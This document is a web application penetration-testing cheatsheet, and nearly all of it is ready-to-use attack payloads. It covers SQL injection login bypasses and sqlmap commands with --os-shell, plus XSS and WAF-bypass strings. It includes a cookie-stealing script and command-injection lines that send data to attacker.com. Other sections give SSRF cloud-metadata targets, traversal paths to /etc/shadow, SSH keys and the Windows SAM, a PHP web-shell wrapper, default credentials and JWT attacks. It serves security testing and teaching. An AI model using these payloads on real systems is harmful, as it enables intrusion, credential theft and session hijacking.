# Web Application Security Cheatsheet

Quick reference for web application penetration testing, OWASP vulnerabilities, and common attack techniques.

## OWASP Top 10 (2021)

| # | Category | Description |
|---|----------|-------------|
| A01 | Broken Access Control | IDOR, privilege escalation, directory traversal |
| A02 | Cryptographic Failures | Weak encryption, sensitive data exposure |
| A03 | Injection | SQLi, XSS, command injection, LDAP injection |
| A04 | Insecure Design | Missing security controls, flawed architecture |
| A05 | Security Misconfiguration | Default creds, verbose errors, XXE |
| A06 | Vulnerable Components | Outdated libraries, unpatched dependencies |
| A07 | Authentication Failures | Weak passwords, session fixation, brute force |
| A08 | Software/Data Integrity | Insecure deserialization, unsigned updates |
| A09 | Logging Failures | Missing audit trails, no alerting |
| A10 | SSRF | Server-side request forgery |

---

## SQL Injection

### Detection
```
# Test characters
'
"
#
--
;
```

### Login Bypass
```sql
' OR 1=1--
' OR 1=1#
admin'--
admin'#
' OR '1'='1
" OR "1"="1
1' or '1' = '1
1" or "1" = "1
```

### Union-Based
```sql
' UNION SELECT 1,2,3--
' UNION SELECT null,null,null--
' UNION SELECT username,password FROM users--
```

### Blind SQLi (Time-Based)
```sql
' AND SLEEP(5)--
' WAITFOR DELAY '0:0:5'--
'; IF (1=1) WAITFOR DELAY '0:0:5'--
```

### SQLMap
```bash
# Basic scan
sqlmap -u "http://target.com/page?id=1" --batch

# With POST data
sqlmap -u "http://target.com/login" --data "user=admin&pass=test" --batch

# Enumerate databases
sqlmap -u "http://target.com/page?id=1" --dbs

# Dump specific table
sqlmap -u "http://target.com/page?id=1" -D dbname -T users --dump

# Common options
--random-agent    # Random user agent
--level=5         # Increase test level
--risk=3          # Increase risk level
--threads=10      # Parallel requests
--os-shell        # OS shell if possible
```

---

## Cross-Site Scripting (XSS)

### Types
- **Reflected**: Input immediately returned in response
- **Stored**: Payload saved and executed for other users
- **DOM-based**: Client-side JavaScript processes malicious input

### Basic Payloads
```html
<script>alert('XSS')</script>
<script>alert(document.cookie)</script>
<img src=x onerror=alert('XSS')>
<svg onload=alert('XSS')>
<body onload=alert('XSS')>
```

### WAF Bypass Techniques
```html
<!-- Case variation -->
<ScRiPt>alert('XSS')</sCrIpT>

<!-- Event handlers -->
<img src=x onerror=alert('XSS')>
<svg/onload=alert('XSS')>
<body onpageshow=alert('XSS')>

<!-- Encoding -->
<script>alert(String.fromCharCode(88,83,83))</script>

<!-- Without parentheses -->
<script>alert`XSS`</script>
<img src=x onerror=alert`XSS`>
```

### Cookie Stealing
```html
<script>
new Image().src="http://attacker.com/steal?c="+document.cookie;
</script>
```

---

## Server-Side Request Forgery (SSRF)

### Common Targets
```
# Localhost
http://127.0.0.1
http://localhost
http://0.0.0.0

# Cloud metadata
http://169.254.169.254/latest/meta-data/  # AWS
http://metadata.google.internal/           # GCP
http://169.254.169.254/metadata/instance   # Azure

# Internal services
http://192.168.0.1
http://10.0.0.1
http://172.16.0.1
```

### Bypass Techniques
```
# Decimal IP
http://2130706433  # 127.0.0.1

# Hex IP
http://0x7f000001  # 127.0.0.1

# URL encoding
http://127.0.0.1%00@attacker.com

# DNS rebinding
Use your own DNS server that resolves to internal IP
```

---

## Directory Traversal / LFI

### Basic Payloads
```
../../../etc/passwd
....//....//....//etc/passwd
..%2f..%2f..%2fetc/passwd
%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd
```

### Common Targets (Linux)
```
/etc/passwd
/etc/shadow
/etc/hosts
/proc/self/environ
/var/log/apache2/access.log
~/.ssh/id_rsa
~/.bash_history
```

### Common Targets (Windows)
```
C:\Windows\System32\config\SAM
C:\Windows\repair\SAM
C:\Windows\System32\drivers\etc\hosts
C:\inetpub\logs\LogFiles\
```

### LFI to RCE
```
# Log poisoning
# 1. Inject PHP into User-Agent
# 2. Include log file
/var/log/apache2/access.log

# PHP wrappers
php://filter/convert.base64-encode/resource=index.php
php://input  # POST data as code
data://text/plain,<?php system($_GET['cmd']); ?>
```

---

## Command Injection

### Detection Characters
```
;
|
||
&
&&
`command`
$(command)
```

### Payloads
```bash
; whoami
| whoami
|| whoami
& whoami
&& whoami
`whoami`
$(whoami)

# Blind (time-based)
; sleep 5
| sleep 5
& ping -c 5 127.0.0.1

# Out-of-band
; curl http://attacker.com/$(whoami)
; nslookup $(whoami).attacker.com
```

---

## Insecure Direct Object Reference (IDOR)

### Testing Approach
```
# Change numeric IDs
/api/user/123 → /api/user/124

# Change GUIDs (try sequential or predictable)
/api/doc/abc-123 → /api/doc/abc-124

# Parameter manipulation
?user_id=1 → ?user_id=2
?file=report_1.pdf → ?file=report_2.pdf

# HTTP method tampering
GET /api/admin → POST /api/admin
```

---

## Authentication Bypass

### Default Credentials
```
admin:admin
admin:password
root:root
test:test
guest:guest
```

### Brute Force Protection Bypass
```
# Header manipulation
X-Forwarded-For: 127.0.0.1
X-Real-IP: 127.0.0.1
X-Originating-IP: 127.0.0.1

# Username enumeration
# Look for timing differences
# Look for response differences
```

### JWT Attacks
```bash
# None algorithm
# Change "alg": "HS256" to "alg": "none"

# Weak secret
hashcat -a 0 -m 16500 jwt.txt wordlist.txt

# Key confusion (RS256 to HS256)
# Sign with public key as HMAC secret
```

---

## Burp Suite Quick Reference

### Keyboard Shortcuts
| Action | Shortcut |
|--------|----------|
| Send to Repeater | Ctrl+R |
| Send to Intruder | Ctrl+I |
| Forward request | Ctrl+F |
| Drop request | Ctrl+D |

### Intruder Attack Types
- **Sniper**: Single payload position, one at a time
- **Battering ram**: Same payload all positions
- **Pitchfork**: Different payload lists, parallel
- **Cluster bomb**: All combinations

---

## Useful Tools

| Tool | Purpose |
|------|---------|
| Burp Suite | Proxy, scanner, manual testing |
| SQLMap | Automated SQL injection |
| ffuf | Web fuzzing |
| Gobuster | Directory brute forcing |
| Nikto | Web server scanner |
| WPScan | WordPress scanner |
| Nuclei | Template-based scanning |

---

## Resources

- [PortSwigger Web Security Academy](https://portswigger.net/web-security)
- [OWASP Testing Guide](https://owasp.org/www-project-web-security-testing-guide/)
- [HackTricks Web](https://book.hacktricks.xyz/)
- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings)
